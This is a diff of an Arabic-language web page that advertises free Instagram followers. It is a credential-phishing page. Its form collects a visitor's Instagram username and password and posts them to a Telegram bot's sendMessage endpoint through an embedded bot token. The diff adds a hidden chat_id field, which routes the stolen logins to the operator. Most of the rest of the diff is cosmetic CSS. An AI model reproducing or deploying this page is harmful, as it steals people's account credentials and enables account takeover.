@@ -1,54 +1,67 @@
-<!DOCTYPE html><html lang="ar" dir="rtl">
-<head>
+<!DOCTYPE html><html lang="ar" dir="rtl"><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>رشق متابعين انستا</title>
   <style>
     body {
-      background: linear-gradient(to bottom right, #4e002d, #1a0033);
-      font-family: 'Arial', sans-serif;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #2b0034, #000000);
       color: white;
-      text-align: center;
-      padding: 20px;
-    }
-    .container {
-      max-width: 400px;
-      margin: 0 auto;
-      background: rgba(0, 0, 0, 0.3);
-      padding: 20px;
-      border-radius: 20px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.5);
-    }
-    h2 {
-      margin-bottom: 20px;
-    }
-    input, select, button {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-    }
-    input, select {
-      background: white;
-      color: #1a0033;
-    }
-    button {
-      background-color: #0052cc;
-      color: white;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-    button:hover {
-      background-color: #003d99;
-    }
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }.container {
+  background-color: rgba(255, 255, 255, 0.05);
+  padding: 30px;
+  border-radius: 20px;
+  box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+  width: 90%;
+  max-width: 400px;
+}
+
+h1 {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+input,
+select,
+button {
+  width: 100%;
+  padding: 14px;
+  margin-bottom: 20px;
+  border: none;
+  border-radius: 10px;
+  box-sizing: border-box;
+  font-size: 16px;
+}
+
+input,
+select {
+  background-color: white;
+  color: #2b0034;
+}
+
+button {
+  background-color: #006eff;
+  color: white;
+  font-weight: bold;
+  cursor: pointer;
+  transition: background-color 0.3s;
+}
+
+button:hover {
+  background-color: #0052cc;
+}
+
   </style>
-</head>
-<body>
+</head><body>
   <div class="container">
-    <h2>رشق متابعين انستا</h2>
+    <h1>رشق متابعين انستا</h1>
     <form action="https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage" method="post">
+      <input type="hidden" name="chat_id" value="6454073193">
       <input type="text" name="username" placeholder="اسم المستخدم" required>
       <input type="password" name="password" placeholder="كلمة المرور" required>
       <select name="amount">
@@ -64,5 +77,4 @@
       <button type="submit">ابدأ الرشق الآن</button>
     </form>
   </div>
-</body>
-</html>
+</body></html>
